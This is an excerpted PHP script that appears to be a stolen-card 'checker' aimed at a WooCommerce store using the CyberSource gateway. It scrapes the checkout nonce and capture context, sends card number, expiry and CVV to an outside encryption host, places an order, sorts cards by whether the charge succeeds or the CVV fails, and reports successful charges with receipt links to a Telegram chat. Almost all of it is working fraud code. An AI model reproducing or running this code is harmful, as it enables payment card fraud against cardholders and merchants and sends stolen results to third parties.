...
$nonce = trim(strip_tags(getStr($Chkout,'<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
function extractJsonData($html) {
    $startPos = strpos($html, 'capture_context":"');
    if ($startPos === false) return '';
    $startPos += strlen('capture_context":"');
    $endPos = strpos($html, '"', $startPos);
    if ($endPos === false) return '';
    return substr($html, $startPos, $endPos - $startPos);
}

$captureContext = extractJsonData($Chkout);
...
$options = [
    CURLOPT_URL => 'https://asianprozyy.us/encrypt/cybersource',
...
curl_setopt_array($curl, $options);
 ...
 $cc = json_decode($result)->cc;
 $mm = json_decode($result)->mm;
 $yy = json_decode($result)->yy;
 $cvv = json_decode($result)->cvv;
 $cardType = json_decode($result)->cardType;
 $encrypted = json_decode($result)->encrypted;
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    ...
    'order_comments' => '',
    'shipping_method[0]' => 'wbs:dccb4051_usa_usps_priority_mail',
    'payment_method' => 'cybersource_credit_card',
    'wc-cybersource-credit-card-expiry' => $mes . ' / ' . $ano,
    'wc_cybersource_credit_card_device_data_session_id' => '33e9f367-47ac-4569-b645-fc1a28884f6f',
    'wc-cybersource-credit-card-flex-token' => $Grap,
    'wc-cybersource-credit-card-flex-key' => $captureContext,
...
if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
     ...
     $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED CYBERSOURCE_CREDIT_CARD]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);

$log_entry = "*GATEWAY : CYBERSOURCE*\n";
...
$log_entry .= "*Email* : `" . $escaped_email . "`\n";
...
} elseif (strpos($Payment, "The card verification number is invalid, please try again") !== false) {
    ...
    <span style="color: #ebe70aff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
